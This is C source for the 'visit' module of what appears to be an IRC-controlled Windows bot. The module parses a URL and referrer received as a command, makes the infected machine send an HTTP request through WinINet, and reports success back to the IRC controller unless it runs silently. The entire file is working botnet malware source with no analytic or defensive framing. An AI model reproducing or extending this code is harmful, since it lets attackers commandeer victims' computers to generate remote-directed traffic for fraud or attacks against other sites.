#include "../h/includes.h"
#include "../h/functions.h"
#include "../h/externs.h"

#ifndef NO_VISIT

DWORD WINAPI VisitThread(LPVOID param)
{
	HINTERNET ch = 0, req = 0;

	const char *accept = "*/*";
	char vhost[128], vuser[128], vpass[128], vpath[256], sendbuf[IRCLINE];

	NTHREAD visit = *((NTHREAD *)param);
	NTHREAD *visits = (NTHREAD *)param;
	IRC* irc=(IRC*)visit.conn;
	visits->gotinfo = TRUE;

	// zero out string varaiables
	memset(vhost, 0, sizeof(vhost));
	memset(vuser, 0, sizeof(vuser));
	memset(vpass, 0, sizeof(vpass));
	memset(vpath, 0, sizeof(vpath));

	// zero out url structure and set options
	URL_COMPONENTS url;
	memset(&url, 0, sizeof(url));
	url.dwStructSize = sizeof(url);
	url.dwHostNameLength = 1;
    url.dwUserNameLength = 1;
    url.dwPasswordLength = 1;
    url.dwUrlPathLength = 1;

	do {
		// crack the url (break it into its main parts)
		if (!fInternetCrackUrl(visit.data1, strlen(visit.data1), 0, &url)) {
			sprintf(sendbuf,"%s Invalid URL.", visit_title);
			break;
		}

		// copy url parts into variables
		if (url.dwHostNameLength > 0) 
			strncpy(vhost, url.lpszHostName, url.dwHostNameLength);

		int vport = url.nPort;
		if (url.dwUserNameLength > 0) 
			strncpy(vuser, url.lpszUserName, url.dwUserNameLength);

		if (url.dwPasswordLength > 0) 
			strncpy(vpass, url.lpszPassword, url.dwPasswordLength);

		if (url.dwUrlPathLength > 0) 
			strncpy(vpath, url.lpszUrlPath, url.dwUrlPathLength);


		ch = fInternetConnect(ih, vhost,(unsigned short)vport, vuser, vpass, INTERNET_SERVICE_HTTP, 0, 0);
		if (ch == NULL) {
			sprintf(sendbuf,"%s Could not open a connection.", visit_title);
			break;
		}

		req = fHttpOpenRequest(ch, NULL, vpath, NULL, visit.data2, &accept, INTERNET_FLAG_NO_UI, 0);
		if (req == NULL) {
			sprintf(sendbuf,"%s Failed to connect to HTTP server.", visit_title);
			break;
		}

		if (fHttpSendRequest(req, NULL, 0, NULL, 0))
			sprintf(sendbuf,"%s URL visited.", visit_title);
		else
			sprintf(sendbuf,"%s Failed to get requested URL from HTTP server.", visit_title);		
	} while(0);

	if (!visit.silent) irc->pmsg(visit.target,sendbuf);

	fInternetCloseHandle(ch);
	fInternetCloseHandle(req);

	clearthread(visit.threadnum);

	ExitThread(0);

	return 0;
}
#endif
